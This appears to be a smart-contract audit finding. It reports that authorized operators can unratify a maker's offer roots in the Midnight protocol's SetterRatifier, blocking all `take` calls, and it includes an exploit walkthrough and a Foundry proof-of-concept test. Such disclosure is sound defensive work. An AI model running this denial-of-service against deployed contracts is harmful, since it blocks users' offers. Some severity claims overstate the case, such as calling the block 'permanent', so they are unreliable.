### Title
Authorized Operator Can Unratify Maker's Roots via SetterRatifier, DoS-ing All Take Flows - (File: src/ratifiers/SetterRatifier.sol)

### Summary
`SetterRatifier.setIsRootRatified` permits any address authorized by the maker in Midnight's global `isAuthorized` mapping to set `isRootRatified[maker][root]` to `false`. Because `Midnight.take` calls `IRatifier.isRatified` and reverts with `RatifierFail` when it returns anything other than `CALLBACK_SUCCESS`, an authorized operator can silently unratify a live root and permanently block all takers from filling any offer under that root until the maker re-ratifies it.

### Finding Description
**Code path:**

`SetterRatifier.setIsRootRatified` (line 24–28): [1](#0-0) 

The authorization guard is:
```solidity
require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
isRootRatified[maker][root] = newIsRootRatified;
```

The function accepts `bool newIsRootRatified` — it is bidirectional. Any address for which `isAuthorized[maker][attacker]` is `true` can pass `false` and zero out the ratification.

`Midnight.take` (lines 355–356): [2](#0-1) 

```solidity
require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());
```

`SetterRatifier.isRatified` (line 35): [3](#0-2) 

```solidity
require(isRootRatified[offer.maker][root], NotRatified());
```

**Exploit flow:**
1. Maker calls `midnight.setIsAuthorized(attacker, true, maker)` for any legitimate reason (e.g., to let a bot repay debt or manage positions).
2. Maker calls `setterRatifier.setIsRootRatified(maker, root, true)` — offer tree is live.
3. Attacker calls `setterRatifier.setIsRootRatified(maker, root, false)` — passes the authorization check because `isAuthorized[maker][attacker]` is `true`.
4. Any subsequent `midnight.take(offer, ...)` call reaches `isRatified`, which reverts with `NotRatified`.
5. `take` reverts with `RatifierFail`. All offers under that root are unfillable.

**Why existing checks do not stop it:**
- The only guard in `setIsRootRatified` is the `isAuthorized` check, which the attacker satisfies.
- `Midnight.take` has no independent check that the ratification state has not changed since the offer was created.
- There is no minimum-ratification-duration or maker-only unratification guard.
- Contrast with `EcrecoverRatifier.cancelRoot`: that function only sets `isRootCanceled = true` (one-way); it cannot be reversed by an operator, and there is no equivalent "un-cancel." [4](#0-3) 

### Impact Explanation
Any authorized operator — granted authorization for any reason — can unratify any root belonging to the maker at zero cost (single storage write). Every offer hashed under that root becomes permanently unfillable until the maker re-ratifies. This is a low-cost, repeatable DoS on all `take` flows for the affected root, directly violating the invariant that a ratified, unexpired offer must remain fillable.

### Likelihood Explanation
The precondition — maker having authorized at least one other address — is common and expected in normal protocol usage (bots, portfolio managers, relayers). The attacker does not need any funds, special role, or privileged access beyond being an authorized operator. The attack is a single permissionless call and can be repeated immediately after the maker re-ratifies, making mitigation by the maker impractical.

### Recommendation
Restrict unratification (setting `newIsRootRatified = false`) to `maker == msg.sender` only, while continuing to allow authorized operators to ratify (`true`) on behalf of the maker:

```solidity
function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
    if (newIsRootRatified) {
        require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
    } else {
        require(maker == msg.sender, Unauthorized());
    }
    isRootRatified[maker][root] = newIsRootRatified;
    emit SetIsRootRatified(msg.sender, maker, root, newIsRootRatified);
}
```

This mirrors the one-way semantics of `EcrecoverRatifier.cancelRoot`, where only the maker (or their authorized agent) can cancel, but the cancellation cannot be reversed by a third party.

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {SetterRatifierTest} from "test/SetterRatifierTest.sol";
import {ISetterRatifier} from "src/ratifiers/interfaces/ISetterRatifier.sol";
import {IMidnight} from "src/interfaces/IMidnight.sol";
import {HashLib} from "src/ratifiers/libraries/HashLib.sol";

contract SetterRatifierDoSTest is SetterRatifierTest {
    function testAuthorizedOperatorCanUnratifyAndDoSTake() public {
        address attacker = address(0xdead);
        Offer memory offer = makeOffer(lender);
        bytes32 root = HashLib.hashOffer(offer);
        bytes memory ratifierData = abi.encode(root, 0, new bytes32[](0));

        // Step 1: maker ratifies the root
        vm.prank(lender);
        setterRatifier.setIsRootRatified(lender, root, true);
        assertTrue(setterRatifier.isRootRatified(lender, root));

        // Step 2: maker authorizes attacker (for any reason)
        vm.prank(lender);
        midnight.setIsAuthorized(attacker, true, lender);

        // Step 3: attacker unratifies the root
        vm.prank(attacker);
        setterRatifier.setIsRootRatified(lender, root, false);
        assertFalse(setterRatifier.isRootRatified(lender, root));

        // Step 4: authorize setterRatifier as required by take
        vm.prank(lender);
        midnight.setIsAuthorized(address(setterRatifier), true, lender);

        // Step 5: taker attempts take — must revert with RatifierFail
        vm.prank(borrower);
        vm.expectRevert(IMidnight.RatifierFail.selector);
        midnight.take(offer, ratifierData, 0, borrower, borrower, address(0), hex"");
    }
}
```

**Expected assertions:** `setIsRootRatified(lender, root, false)` succeeds (no revert), `isRootRatified(lender, root)` returns `false`, and `midnight.take` reverts with `RatifierFail`.

### Citations

**File:** src/ratifiers/SetterRatifier.sol (L24-28)
```text
    function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
        require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
        isRootRatified[maker][root] = newIsRootRatified;
        emit SetIsRootRatified(msg.sender, maker, root, newIsRootRatified);
    }
```

**File:** src/ratifiers/SetterRatifier.sol (L35-35)
```text
        require(isRootRatified[offer.maker][root], NotRatified());
```

**File:** src/Midnight.sol (L355-356)
```text
        require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
        require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());
```

**File:** src/ratifiers/EcrecoverRatifier.sol (L27-31)
```text
    function cancelRoot(address maker, bytes32 root) external {
        require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
        isRootCanceled[maker][root] = true;
        emit CancelRoot(msg.sender, maker, root);
    }
```
